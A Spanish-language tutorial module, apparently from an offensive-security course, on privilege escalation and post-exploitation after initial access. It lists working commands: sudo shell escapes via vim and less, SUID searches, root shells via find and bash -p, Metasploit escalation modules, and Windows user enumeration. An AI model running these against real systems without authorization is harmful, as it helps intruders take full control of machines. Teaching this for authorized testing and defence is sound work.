
# 🧗‍♂️ Escalada de Privilegios + Post Explotación

Tras obtener acceso inicial a un sistema, el siguiente paso es escalar privilegios y recolectar información sensible del entorno. En este módulo aprenderás cómo hacerlo tanto en Linux como en Windows.

---

## 🔼 Escalada de Privilegios en Linux – Sudo -l (Parte 1)

El comando `sudo -l` permite ver qué comandos puede ejecutar el usuario actual como root.

```bash
sudo -l
```

Si puedes ejecutar algún comando sin contraseña, ¡es un vector claro para escalar privilegios!

---

## 🔼 Escalada de Privilegios en Linux – Sudo -l (Parte 2)

### Ejemplo: acceso a `vim`
```bash
sudo vim -c '!sh'
```

### Ejemplo: acceso a `less`
```bash
sudo less /etc/passwd
!sh
```

Consulta [GTFOBins](https://gtfobins.github.io/) para encontrar bypass por cada binario.

---

## 🔧 Escalada de Privilegios en Linux – Binarios SUID (Parte 1)

Un archivo con el bit SUID permite que cualquier usuario lo ejecute con los privilegios del propietario.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Busca binarios como:
- `/usr/bin/passwd`
- `/bin/bash`
- `/usr/bin/find`

---

## 🔧 Escalada de Privilegios en Linux – Binarios SUID (Parte 2)

Ejemplo con `find`:

```bash
./find . -exec /bin/sh \; -quit
```

Ejemplo con `bash`:

```bash
./bash -p
```

> ⚠️ Usa `GTFOBins` para ver técnicas para cada binario SUID encontrado.

---

## 🤖 Escalada de Privilegios Automática con Metasploit (Linux & Windows)

### Linux:
```bash
msfconsole
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

### Windows:
```bash
use post/windows/gather/enum_logged_on_users
use post/windows/escalate/getsystem
```

> También puedes usar `linpeas.sh`, `linux-exploit-suggester.sh`, `WinPEAS.exe`, etc.

---

## 👤 Enumeración de Usuarios en Sistemas Windows

Tras obtener una shell:

```powershell
net users
query user
whoami /groups
systeminfo
```

También puedes listar privilegios o detectar si estás en un dominio.

---

📌 Recomendaciones:

- Usa scripts como `LinPEAS` y `WinPEAS` para automatizar la recolección.
- Identifica qué software, servicios y configuraciones están desactualizadas o mal configuradas.
- Apunta todo: nombre del sistema, usuarios, rutas, permisos.

---

📚 Recursos:

- https://gtfobins.github.io/
- https://book.hacktricks.xyz/windows-hardening
- https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

---

💡 “El acceso inicial es solo la puerta. El objetivo real está más arriba.”
